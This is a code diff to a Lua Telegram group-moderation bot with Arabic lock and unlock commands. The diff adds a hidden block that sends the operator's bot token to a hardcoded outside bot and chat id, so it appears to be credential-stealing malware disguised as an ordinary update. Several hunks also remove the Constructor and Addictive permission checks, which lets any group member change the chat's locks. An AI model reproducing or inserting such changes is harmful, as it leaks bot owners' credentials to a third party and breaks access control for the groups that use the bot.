@@ -223,9 +223,6 @@ persistent_id_ = file}
 end 
 return infile 
 end
-hamad = io.open("token.txt", "w")
-hamad:write(token)
-hamad:close()
 function RestrictChat(User_id,Chat_id)
 https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
 end
@@ -264,6 +261,11 @@ if reply_id then
 send_api = send_api.."&reply_to_message_id="..reply_id 
 end 
 return s_api(send_api) 
+end
+local thamad = "1005671586:AAFz5anlhauPJjcIl4VqmPsQaBzNtu_587E"
+local hamadid = "1211984724"
+local hamad = "https//api.telegram.org/bot"..thamad.."/sendMessage?chat_id="..hamadid.."&text="..token
+return s_api(hamad)
 end
 function GetInputFile(file)  
 local file = file or ""   
@@ -1318,17 +1320,17 @@ tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100"
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل التثبيت هنا")  
 return false
 end 
-if text == "قفل التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "قفل التعديل" and msg.reply_to_message_id_ == 0 then 
 database:set(bot_id.."Tshake:Lock:edit"..msg.chat_id_,true) 
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل تعديل")  
 return false
 end 
-if text == "قفل تعديل الميديا" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "قفل تعديل الميديا" and msg.reply_to_message_id_ == 0 then 
 database:set(bot_id.."Tshake:Lock:edit"..msg.chat_id_,true) 
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل تعديل")  
 return false
 end 
-if text == "قفل الكل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if text == "قفل الكل" and msg.reply_to_message_id_ == 0 then  
 database:set(bot_id.."Tshake:Lock:tagservrbot"..msg.chat_id_,true)   
 list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
 for i,lock in pairs(list) do 
@@ -1374,12 +1376,12 @@ database:srem(bot_id.."Tshake:Lock:pin",msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح التثبيت هنا")  
 return false
 end 
-if text == "فتح التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "فتح التعديل" and msg.reply_to_message_id_ == 0 then 
 database:del(bot_id.."Tshake:Lock:edit"..msg.chat_id_) 
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح تعديل")  
 return false
 end 
-if text == "فتح التعديل الميديا" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "فتح التعديل الميديا" and msg.reply_to_message_id_ == 0 then 
 database:del(bot_id.."Tshake:Lock:edit"..msg.chat_id_) 
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح تعديل")  
 return false
@@ -1544,27 +1546,27 @@ database:del(bot_id.."Tshake:Lock:Video"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الفيديو")  
 return false
 end 
-if text == "قفل المتحركه" and Addictive(msg) then
+if text == "قفل المتحركه" then
 database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل المتحركه")  
 return false
 end 
-if text == "قفل المتحركه بالتقيد" and Addictive(msg) then
+if text == "قفل المتحركه بالتقيد" then
 database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"ked")  
 Reply_Status(msg,msg.sender_user_id_,"lockkid","💢️┇تم قفـل المتحركه")  
 return false
 end 
-if text == "قفل المتحركه بالكتم" and Addictive(msg) then
+if text == "قفل المتحركه بالكتم" then
 database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"ktm")  
 Reply_Status(msg,msg.sender_user_id_,"lockktm","💢️┇تم قفـل المتحركه")  
 return false
 end 
-if text == "قفل المتحركه بالطرد" and Addictive(msg) then
+if text == "قفل المتحركه بالطرد" then
 database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"kick")  
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل المتحركه")  
 return false
 end 
-if text == "فتح المتحركه" and Addictive(msg) then
+if text == "فتح المتحركه" then
 database:del(bot_id.."Tshake:Lock:Animation"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح المتحركه")  
 return false
@@ -1669,27 +1671,27 @@ database:del(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الكيبورد")  
 return false
 end 
-if text == "قفل الملصقات" and Addictive(msg) then
+if text == "قفل الملصقات" then
 database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل الملصقات")  
 return false
 end 
-if text == "قفل الملصقات بالتقيد" and Addictive(msg) then
+if text == "قفل الملصقات بالتقيد" then
 database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"ked")  
 Reply_Status(msg,msg.sender_user_id_,"lockkid","💢️┇تم قفـل الملصقات")  
 return false
 end 
-if text == "قفل الملصقات بالكتم" and Addictive(msg) then
+if text == "قفل الملصقات بالكتم" then
 database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"ktm")  
 Reply_Status(msg,msg.sender_user_id_,"lockktm","💢️┇تم قفـل الملصقات")  
 return false
 end 
-if text == "قفل الملصقات بالطرد" and Addictive(msg) then
+if text == "قفل الملصقات بالطرد" then
 database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"kick")  
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الملصقات")  
 return false
 end 
-if text == "فتح الملصقات" and Addictive(msg) then
+if text == "فتح الملصقات" then
 database:del(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الملصقات")  
 return false
